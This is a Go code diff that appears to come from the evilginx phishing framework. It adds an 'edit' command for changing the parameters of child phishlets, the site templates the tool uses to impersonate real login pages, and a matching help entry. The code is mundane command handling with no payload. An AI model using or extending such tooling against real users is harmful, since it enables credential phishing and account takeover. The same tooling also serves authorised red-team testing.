@@ -633,6 +633,42 @@ func (t *Terminal) handlePhishlets(args []string) error {
 		} else {
 			log.Error("%v", err)
 		}
+	} else if pn >= 3 && args[0] == "edit" {
+		pl, err := t.cfg.GetPhishlet(args[1])
+		if err == nil {
+			params := make(map[string]string)
+
+			if pl.ParentName != "" {
+				for n := 2; n < pn; n++ {
+					val := args[n]
+
+					sp := strings.Index(val, "=")
+					if sp == -1 {
+						return fmt.Errorf("set custom parameters for the child phishlet using format 'param1=value1 param2=value2'")
+					}
+					k := val[:sp]
+					v := val[sp+1:]
+
+					params[k] = v
+
+					log.Info("adding parameter: %s='%s'", k, v)
+				}
+
+				err := t.cfg.EditSubPhishlet(args[1], params)
+				if err != nil {
+					log.Error("%v", err)
+				} else {
+					t.cfg.SaveSubPhishlets()
+					log.Info("edited child phishlet: %s", args[1])
+					log.Important("you need to restart evilginx for the changes to take effect!")
+				}
+			} else {
+				return fmt.Errorf("phishlet '%s' can't be edited - you can only edit child phishlets.", args[1])
+			}
+			return nil
+		} else {
+			log.Error("%v", err)
+		}
 	} else if pn == 0 {
 		t.output("%s", t.sprintPhishletStatus(""))
 		return nil
@@ -1231,6 +1267,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
+	h.AddSubCommand("phishlets", []string{"edit"}, "edit <phishlet> <key1=value1> <key2=value2>", "edit child phishlet with custom parameters")	
 	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
 	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
 	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
